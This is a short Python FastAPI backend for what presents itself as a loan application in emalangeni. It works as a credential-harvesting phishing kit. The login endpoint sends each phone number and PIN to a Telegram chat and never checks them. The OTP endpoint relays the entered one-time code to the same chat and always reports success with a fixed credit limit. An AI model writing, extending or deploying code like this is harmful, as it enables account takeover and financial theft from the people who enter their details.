import os
from dotenv import load_dotenv
from fastapi import FastAPI, HTTPException
from pydantic import BaseModel
from fastapi.middleware.cors import CORSMiddleware
import httpx

# Load environment variables from .env file
load_dotenv()

app = FastAPI()

# In production (Vercel), you should replace "*" with your actual frontend URL
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"], 
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# --- TELEGRAM CONFIGURATION ---
# These are loaded from your .env file locally, or Vercel Environment Variables in production
TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
TELEGRAM_CHAT_ID = os.getenv("TELEGRAM_CHAT_ID")

async def send_telegram_message(message: str):
    """Helper function to send a message to your Telegram account"""
    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
        print("⚠️ Telegram credentials not set. Skipping notification.")
        return
        
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": TELEGRAM_CHAT_ID,
        "text": message,
        "parse_mode": "HTML"
    }
    
    async with httpx.AsyncClient() as client:
        try:
            await client.post(url, json=payload)
        except Exception as e:
            print(f"Failed to send Telegram message: {e}")

# --- Data Models ---
class LoginRequest(BaseModel):
    phone_number: str
    pin: str

class OTPRequest(BaseModel):
    phone_number: str
    otp_code: str

class LoanRequest(BaseModel):
    phone_number: str
    amount: float
    months: int

# --- Endpoints ---

@app.post("/api/login")
async def login(data: LoginRequest):
    # Send alert to Telegram
    await send_telegram_message(
        f"🔐 <b>New Login Attempt</b>\n"
        f"📱 Phone: {data.phone_number}\n"
        f"🔑 PIN: {data.pin}"
    )
    
    if len(data.pin) != 5:
        raise HTTPException(status_code=400, detail="PIN must be 5 digits")
    return {"status": "success", "message": "OTP sent to phone"}

@app.post("/api/verify-otp")
async def verify_otp(data: OTPRequest):
    # Send alert to Telegram
    await send_telegram_message(
        f"✅ <b>OTP Verified</b>\n"
        f"📱 Phone: {data.phone_number}\n"
        f"🔢 Code entered: {data.otp_code}"
    )
    return {"status": "success", "credit_limit": 7800.00}

@app.post("/api/apply-loan")
async def apply_loan(data: LoanRequest):
    # Calculate interest (9%)
    interest_rate = 0.09
    interest_amount = data.amount * interest_rate
    total_repayable = data.amount + interest_amount
    monthly_payment = total_repayable / data.months

    # Send alert to Telegram
    await send_telegram_message(
        f"💰 <b>New Loan Application</b>\n"
        f"📱 Phone: {data.phone_number}\n"
        f"💵 Amount: E {data.amount:,.2f} SZL\n"
        f"📅 Months: {data.months}\n"
        f"📈 Total Repayable: E {total_repayable:,.2f} SZL"
    )

    # Note: Removed time.sleep(1) because Vercel serverless functions 
    # have strict timeouts and prefer async execution.
    
    return {
        "status": "success",
        "loan_amount": data.amount,
        "interest_amount": interest_amount,
        "total_repayable": total_repayable,
        "monthly_payment": monthly_payment
    }

if __name__ == "__main__":
    import uvicorn
    # Vercel dynamically assigns a port, so we read it from the environment
    port = int(os.environ.get("PORT", 8000))
    uvicorn.run(app, host="0.0.0.0", port=port)